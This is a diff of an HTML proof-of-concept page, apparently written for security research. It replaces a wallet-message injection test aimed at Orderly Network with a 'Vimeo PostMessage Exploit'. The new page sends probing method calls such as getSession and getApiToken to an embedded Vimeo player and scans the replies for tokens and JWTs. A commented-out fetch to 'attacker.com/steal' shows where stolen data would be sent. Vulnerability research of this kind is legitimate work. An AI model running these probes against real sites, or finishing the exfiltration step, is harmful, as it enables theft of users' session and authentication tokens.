@@ -1,64 +1,139 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Orderly Network Message Injection Test</title>
+    <title>Vimeo PostMessage Exploit PoC</title>
+    <style>
+        body { font-family: monospace; padding: 20px; }
+        #results { background: #f0f0f0; padding: 10px; margin: 10px 0; }
+        .critical { background: #ffcccc; border: 2px solid red; }
+        iframe { border: 1px solid #ccc; }
+    </style>
 </head>
 <body>
-    <h1>Cross-Origin Message Injection PoC</h1>
-    <button onclick="testMetaMaskInjection()">Test MetaMask Message</button>
-    <button onclick="testGlowInjection()">Test Glow Message</button>
-    <button onclick="openOrderlyInIframe()">Open Orderly in iframe</button>
+    <h1>🔴 Vimeo PostMessage Vulnerability PoC</h1>
+    <p>Testing postMessage origin validation bypass...</p>
     
-    <div id="log"></div>
-    <iframe id="target" style="width:100%; height:500px;"></iframe>
+    <iframe id="vimeo" 
+            src="https://player.vimeo.com/video/935884964?background=1"
+            width="640" 
+            height="360">
+    </iframe>
+
+    <h2>Results:</h2>
+    <div id="results"></div>
 
     <script>
-        const log = (msg) => {
-            document.getElementById('log').innerHTML += `<p>${msg}</p>`;
-            console.log(msg);
-        };
+        const iframe = document.getElementById('vimeo');
+        const results = document.getElementById('results');
+        let messageCount = 0;
 
-        // Test 1: MetaMask provider injection
-        function testMetaMaskInjection() {
-            const targetWindow = document.getElementById('target').contentWindow;
+        function log(message, data, critical = false) {
+            const div = document.createElement('div');
+            div.className = critical ? 'critical' : '';
+            div.innerHTML = `
+                <strong>${new Date().toISOString()}</strong><br>
+                ${message}<br>
+                <pre>${JSON.stringify(data, null, 2)}</pre>
+                <hr>
+            `;
+            results.insertBefore(div, results.firstChild);
+        }
+
+        // Listen for responses
+        window.addEventListener('message', function(event) {
+            messageCount++;
             
-            const payload = {
-                target: "metamask-inpage",
-                data: {
-                    name: "metamask-provider",
-                    data: {
-                        id: Math.floor(Math.random() * 1000000), // Random ID
-                        error: false
-                    }
+            console.log('📨 Message #' + messageCount);
+            console.log('Origin:', event.origin);
+            console.log('Data:', event.data);
+            
+            // Check if it's from Vimeo
+            if (event.origin === 'https://player.vimeo.com') {
+                const dataStr = JSON.stringify(event.data);
+                
+                // Check for sensitive data
+                const isCritical = dataStr.match(/token|jwt|eyJ|session|api_key|auth/i);
+                
+                log(
+                    `Response from Vimeo (Message #${messageCount})`,
+                    event.data,
+                    isCritical
+                );
+                
+                if (isCritical) {
+                    console.error('🚨 CRITICAL: Sensitive data exposed!');
+                    console.log(event.data);
+                    
+                    // In real attack, exfiltrate here
+                    // fetch('https://attacker.com/steal', {
+                    //     method: 'POST',
+                    //     body: JSON.stringify(event.data)
+                    // });
                 }
-            };
-            
-            log(`Sending MetaMask message: ${JSON.stringify(payload)}`);
-            targetWindow.postMessage(payload, '*');
-        }
-
-        // Test 2: Glow wallet injection
-        function testGlowInjection() {
-            const targetWindow = document.getElementById('target').contentWindow;
-            
-            const payload = {
-                __glow_loaded: true
-            };
-            
-            log(`Sending Glow message: ${JSON.stringify(payload)}`);
-            targetWindow.postMessage(payload, '*');
-        }
-
-        // Open Orderly in iframe
-        function openOrderlyInIframe() {
-            document.getElementById('target').src = 'https://app.orderly.network';
-            log('Loaded Orderly in iframe');
-        }
-
-        // Listen for any messages back
-        window.addEventListener('message', (event) => {
-            log(`Received message from ${event.origin}: ${JSON.stringify(event.data)}`);
+            }
         });
+
+        // Wait for iframe to load
+        setTimeout(() => {
+            console.log('🚀 Starting attack...');
+            log('Attack started - sending test messages...', {});
+            
+            // Test methods from Vimeo Player API
+            const testMethods = [
+                // Standard API methods
+                { method: 'getDuration', desc: 'Get video duration' },
+                { method: 'getCurrentTime', desc: 'Get current playback time' },
+                { method: 'getVideoId', desc: 'Get video ID' },
+                { method: 'getVideoTitle', desc: 'Get video title' },
+                { method: 'getVideoUrl', desc: 'Get video URL' },
+                { method: 'getVolume', desc: 'Get volume' },
+                
+                // Try to get config/state
+                { method: 'getConfig', desc: '⚠️ Try to get config' },
+                { method: 'getState', desc: '⚠️ Try to get state' },
+                { method: 'getPlayerState', desc: '⚠️ Try to get player state' },
+                
+                // Try variations
+                { method: 'config', desc: '⚠️ Direct config access' },
+                { method: 'playerConfig', desc: '⚠️ PlayerConfig access' },
+                { method: '_config', desc: '⚠️ Private config' },
+                
+                // Try to access user data
+                { method: 'getUserData', desc: '🚨 Try to get user data' },
+                { method: 'getUser', desc: '🚨 Try to get user' },
+                { method: 'getSession', desc: '🚨 Try to get session' },
+                { method: 'getApiToken', desc: '🚨 Try to get API token' },
+                { method: 'getAuthToken', desc: '🚨 Try to get auth token' },
+                
+                // Other interesting methods
+                { method: 'getChapters', desc: 'Get chapters' },
+                { method: 'getTextTracks', desc: 'Get text tracks' },
+                { method: 'getQualities', desc: 'Get quality levels' },
+                { method: 'getColor', desc: 'Get player color' },
+            ];
+
+            testMethods.forEach((test, index) => {
+                setTimeout(() => {
+                    console.log(`Sending: ${test.method} - ${test.desc}`);
+                    
+                    iframe.contentWindow.postMessage({
+                        method: test.method,
+                        value: null,
+                        id: index
+                    }, '*');  // Sending to any origin
+                    
+                }, index * 200);
+            });
+
+            // Summary after all tests
+            setTimeout(() => {
+                log('All tests completed', {
+                    totalMessages: messageCount,
+                    note: 'Check console for details'
+                });
+            }, testMethods.length * 200 + 1000);
+
+        }, 3000); // Wait 3 seconds for iframe to fully load
     </script>
 </body>
 </html>
